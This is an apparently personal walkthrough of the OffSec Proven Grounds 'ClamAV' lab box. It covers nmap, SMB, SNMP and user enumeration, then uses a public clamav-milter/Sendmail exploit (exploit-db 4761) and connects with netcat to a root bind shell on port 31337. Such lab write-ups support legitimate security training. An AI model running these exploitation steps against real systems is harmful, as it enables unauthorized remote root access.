# ClamAV - Linux - OffSec - Proven Grounds

Completed: July 21, 2026 - 1:50 mins

References:
- 

## Workflow
### Inital Recon
```
# Inital scan 
nmap -Pn -n -sS -p- -sV --min-hostgroup 255 --min-rtt-timeout 25ms --max-rtt-timeout 100ms --max-retries 1 --max-scan-delay 0 --min-rate 1000 -oA Full-Ports-Scan -vvv --open 192.168.229.42

# Ips and Ports
cat Full-Ports-Scan.nmap| awk '/^Nmap scan report/{ip=$NF} /(\/tcp|\/udp)/ && /open/{split($1,p,"/"); print ip ":" p[1]}' | sort -u > discovery_scan_ip_ports.txt

# Only ports
cat discovery_scan_ip_ports.txt | cut -d: -f2 | sort -u > only-ports-list.txt

# Detailed information on open ports
nmap -Pn -sV -sC --open -p "$(paste -sd, only-ports-list.txt)" 192.168.229.42 -oA detailed-ports-results
```

```
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
| smtp-commands: localhost.localdomain Hello [192.168.45.241], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ph33r
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: share (dangerous)
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5h59m58s, deviation: 2h49m42s, median: 3h59m58s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.14a-Debian)
|   NetBIOS computer name: 
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-21T19:22:02-04:00
|_nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```
#### X - Port 80 - HTTP 
Binary on landing page that was a troll `ifyoudontpwnmeuran00b` and doing directory listing does not showcase much.

#### X - Port 22 - SSH
Very outdated SSH version but not seeing any exploits related to it. 

#### X - Port 445 - SMB
We are able to do directory listing but otherwise not seeing a clear way to enumerate past what is shown
```
smbclient -L //192.168.229.42/ADMIN$ -N   
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
        ADMIN$          IPC       IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------
        0XBABE               0xbabe server (Samba 3.0.14a-Debian) brave pig

        Workgroup            Master
        ---------            -------
        WORKGROUP            0XBABE
```

#### Port 25 - SNMP 
So looks like we have `root` user on the system. 
```
snmpwalk -v2c -c public 192.168.229.42 .1
iso.3.6.1.2.1.1.4.0 = STRING: "Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)"
iso.3.6.1.2.1.1.5.0 = STRING: "0xbabe.local"
```
Use enum4linux to enumerate users and network file shares
```
# Enumerate Users - run enum4linux commands with root permissions
sudo enum4linux -U 192.168.229.42
...
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                                                                                                                  
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x4 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x5 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x6 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0x7 RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0x8 RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0x9 RID: 0x3ea acb: 0x00000011 Account: daemon   Name: daemon    Desc: (null)
index: 0xa RID: 0xbb8 acb: 0x00000011 Account: ryu      Name: ryu,,,    Desc: (null)
index: 0xb RID: 0x3f4 acb: 0x00000011 Account: man      Name: man       Desc: (null)
index: 0xc RID: 0x3f6 acb: 0x00000011 Account: lp       Name: lp        Desc: (null)
index: 0xd RID: 0x4b4 acb: 0x00000011 Account: Debian-exim      Name: (null)    Desc: (null)
index: 0xe RID: 0x43a acb: 0x00000011 Account: gnats    Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0xf RID: 0x42c acb: 0x00000011 Account: backup   Name: backup    Desc: (null)
index: 0x10 RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x11 RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x12 RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x13 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x14 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

```
Use `snmp-check` to see running processes on the target system.
```
snmp-check 192.168.229.42
```
There is a process called `clamav-milter` and a process `sendmail-mta` that appears to be "accepting connections" 
<img width="1320" height="822" alt="image" src="https://github.com/user-attachments/assets/2136f2db-bc96-45b2-9b9f-9b55e4e38b19" />

With a quick search of `clamav-milter` there appears to be an RCE exploit for it. Where `Sendmail` is running on port 25 with version `8.13.4`. 
https://www.exploit-db.com/exploits/4761

<img width="1599" height="251" alt="image" src="https://github.com/user-attachments/assets/d19ab60f-f1d4-4f6f-bfa7-ce66455a1ea2" />

```
# One terminal
perl 4761.pl 192.168.229.42

# other terminal
nc -nv 192.168.229.42 31337
whoami
root
```

```
cd root
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
1bf4210f9fe6bf03efbf1ee27aec9d36
```

#### Port 199 
Did a quick search of this service and seeing that it's actually also `smtp` - https://www.pentestpad.com/port-exploit/port-199-smux-snmp-multiplexing-protocol 
